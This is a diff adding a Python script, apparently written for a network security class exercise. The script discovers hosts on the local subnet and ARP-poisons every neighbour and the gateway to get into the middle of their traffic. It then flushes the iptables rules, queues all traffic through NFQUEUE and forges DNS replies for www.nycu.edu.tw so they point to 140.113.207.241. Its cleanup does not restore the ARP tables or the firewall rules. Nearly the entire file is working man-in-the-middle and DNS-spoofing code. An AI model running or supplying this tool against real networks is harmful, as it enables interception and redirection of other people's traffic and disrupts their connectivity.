@@ -1,0 +1,77 @@
+#!/usr/bin/env python3
+import os
+import scapy.all as scapy
+import netifaces
+from time import sleep
+import subprocess
+import os
+import copy
+import netfilterqueue
+def get_mask_len(mask):
+    mask = mask.split('.')
+    n = 0
+    for i in mask:
+        if(i=="255"):
+            n+=8
+    return n
+def send_arp(hwdst,pdst,psrc):
+    arp = scapy.ARP(op=2, hwdst=hwdst, pdst=pdst, psrc=psrc)
+    scapy.send(arp,verbose=False)
+def process_package(pkg):
+    spkt = scapy.IP(pkg.get_payload())
+    if spkt.haslayer(scapy.DNSRR):
+        if(spkt[scapy.DNSQR].qname == b'www.nycu.edu.tw.'):
+            spkt[scapy.DNS].ancount = 1
+            spkt[scapy.DNS].an = scapy.DNSRR(rrname='www.nycu.edu.tw',
+                                            rdata='140.113.207.241')
+            del spkt[scapy.IP].len
+            del spkt[scapy.IP].chksum
+            del spkt[scapy.UDP].len
+            del spkt[scapy.UDP].chksum
+
+            pkg.set_payload(bytes(spkt))
+            print("Redirect it to 140.113.207.241")
+    pkg.accept()
+def cleanup():
+    print('Cleaning up')
+arp_table= {} 
+mod_time = {}
+gw = None
+if os.getuid() != 0:
+    exit('Please use root')
+gw = netifaces.gateways()[netifaces.AF_INET][0]
+ni_inform = netifaces.ifaddresses(gw[1])[netifaces.AF_INET][0]
+#ideally we want ot get the ip/mask
+m = get_mask_len(ni_inform['netmask'])
+ip = ni_inform['addr']+"/"+str(m) 
+
+#we want to broadcast to get ip address and ARP
+arp_request = scapy.ARP(pdst=ip)
+broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+arp_request_broadcast = broadcast/arp_request
+response = scapy.srp(arp_request_broadcast,timeout=3,verbose=False)[0]
+for x in response:
+    sent,recv = x
+    arp_table[recv.psrc] = recv.hwsrc
+print("Available devices")
+print("---------------------------------------------")
+print("IP                   MAC                     ")
+print("---------------------------------------------")
+for i in arp_table.keys():
+    print(i,"           ",arp_table[i])
+for i in range(50):
+    for neibr in arp_table:
+        if(neibr == gw[0]):
+            continue
+        send_arp(arp_table[gw[0]],pdst=gw[0],psrc=neibr)
+        send_arp(arp_table[neibr],pdst=neibr,psrc=gw[0])
+os.system('sudo iptables -F')
+os.system('iptables -I FORWARD -j NFQUEUE --queue-num 42')
+os.system('iptables -I INPUT -j NFQUEUE --queue-num 42')
+os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 42')
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(42,process_package)
+try:
+    queue.run()
+except KeyboardInterrupt:
+    cleanup()
